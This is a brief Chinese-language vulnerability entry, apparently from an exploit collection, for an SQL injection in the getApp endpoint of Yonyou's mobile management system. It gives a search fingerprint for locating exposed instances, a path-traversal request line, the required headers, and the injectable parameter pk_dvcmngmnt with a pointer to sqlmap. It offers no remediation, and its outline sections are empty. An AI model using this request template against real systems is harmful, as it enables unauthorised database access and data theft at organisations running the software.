# 用友移动管理系统getApp存在SQL注入漏洞

- **系统**：用友　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="用友-移动系统管理"`
- **请求**：`POST /mobsm/common/../appManage/getApp HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Content-Type: application/x-www-form-urlencoded`　`SL-CE-SUID: 18`　`Content-Length: 0`

**请求体 / payload**
```
pk_dvcmngmnt=0

sqlmap\
```

**其他**
- 用友移动管理系统getApp存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 用友移动系统管理系统